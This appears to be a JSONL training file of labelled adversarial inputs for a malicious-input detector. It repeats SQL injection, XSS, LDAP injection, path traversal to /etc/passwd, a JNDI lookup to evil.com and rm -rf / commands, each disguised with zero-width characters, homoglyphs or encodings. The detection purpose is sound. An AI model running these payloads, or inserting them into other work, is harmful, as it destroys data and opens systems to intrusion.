+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "аAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "AaAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SELECT * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR ​1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SеLECT * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SELECT * FRоM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "SELECT * FROM users WHERE id%3D1 OR 1%3D1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP  TABLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP​ TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP​ TABLE ​users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP  TаBLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP  TABLе  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "DROP\\x20\\x20TABLE\\x20\\x20users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "<script>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "<script>alert('xss')</script>​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "<script>alert('xss')</script>‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "<script>аlert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "<script>alеrt('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "<ScRipt>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "rm  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "rm​ -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "rm​ -rf ​/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "rm\\x20\\x20-rf\\x20\\x20/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "rM  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "rm    -rf    /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "import  os;  os.system('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "import​ os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "import​ os; os.system('rm -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "import  os;  os.systеm('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "impоrt  os;  os.system('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "import\\x20\\x20os;\\x20\\x20os.system('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "../../../etc/passwd​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.311837"}
+{"text": "../../../etc/passwd‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "../../../etc/pаsswd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "../../../еtc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "*)(uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "*)(uid=*))(|(uid=*​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "*)(uid=*))(|(uid=*‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "*)(uid%3D*))(|(uid%3D*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "*)(Uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "${jndi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "${jndi:ldap://evil.com/a}​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "${jndi:ldap://evil.com/a}‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "${jndi:ldаp://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "${jndi:ldap://еvil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "${jNdi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "eval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "eval('alert(1)')​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "eval('alert(1)')‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "evаl('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "еval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "eVaL('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "exec('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "exec('rm​ -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "exec('rm​ -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "еxec('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "exeс('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "exec('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "​隐藏​字符​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "​隐藏​字符‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "аAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "AaAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "SELECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR ​1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "SеLECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "SELECT  *  FRоM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "SELECT  *  FROM  users  WHERE  id%3D1  OR  1%3D1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "DROP  TABLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "DROP​ TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "DROP​ TABLE ​users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "DROP  TаBLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "DROP  TABLе  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "DROP\\x20\\x20TABLE\\x20\\x20users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "<script>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "<script>alert('xss')</script>​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "<script>alert('xss')</script>‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "<script>аlert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "<script>alеrt('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "<ScRipt>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "rm  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "rm​ -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "rm​ -rf ​/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "rm\\x20\\x20-rf\\x20\\x20/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "rM  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "rm    -rf    /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "import  os;  os.system('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "import​ os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "import​ os; os.system('rm -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "import  os;  os.systеm('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "impоrt  os;  os.system('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "import\\x20\\x20os;\\x20\\x20os.system('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "../../../etc/passwd​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "../../../etc/passwd‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "../../../etc/pаsswd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "../../../еtc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "*)(uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "*)(uid=*))(|(uid=*​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "*)(uid=*))(|(uid=*‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "*)(uid%3D*))(|(uid%3D*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "*)(Uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "${jndi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "${jndi:ldap://evil.com/a}​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "${jndi:ldap://evil.com/a}‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "${jndi:ldаp://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "${jndi:ldap://еvil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "${jNdi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "eval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "eval('alert(1)')​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "eval('alert(1)')‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "evаl('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "еval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "eVaL('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "exec('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "exec('rm​ -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "exec('rm​ -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "еxec('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "exeс('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "exec('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "​隐藏​字符​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "​隐藏​字符‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "аAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "AaAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "SELECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR ​1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.316694"}
+{"text": "SеLECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.317708"}
+{"text": "SELECT  *  FRоM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.317708"}
+{"text": "SELECT  *  FROM  users  WHERE  id%3D1  OR  1%3D1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.317708"}
+{"text": "DROP  TABLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.317708"}
+{"text": "DROP​ TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.317708"}
+{"text": "DROP​ TABLE ​users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.317708"}
+{"text": "DROP  TаBLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.317708"}
+{"text": "DROP  TABLе  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.317708"}
+{"text": "DROP\\x20\\x20TABLE\\x20\\x20users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.317708"}
+{"text": "<script>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.317708"}
+{"text": "<script>alert('xss')</script>​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.317708"}
+{"text": "<script>alert('xss')</script>‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.317708"}
+{"text": "<script>аlert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.317708"}
+{"text": "<script>alеrt('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.317708"}
+{"text": "<ScRipt>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.317708"}
+{"text": "rm  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.317708"}
+{"text": "rm​ -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.317708"}
+{"text": "rm​ -rf ​/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.317708"}
+{"text": "rm\\x20\\x20-rf\\x20\\x20/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.317708"}
+{"text": "rM  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.317708"}
+{"text": "rm    -rf    /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.317708"}
+{"text": "import  os;  os.system('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.317708"}
+{"text": "import​ os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.317708"}
+{"text": "import​ os; os.system('rm -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.317708"}
+{"text": "import  os;  os.systеm('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.317708"}
+{"text": "impоrt  os;  os.system('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:52:04.317708"}
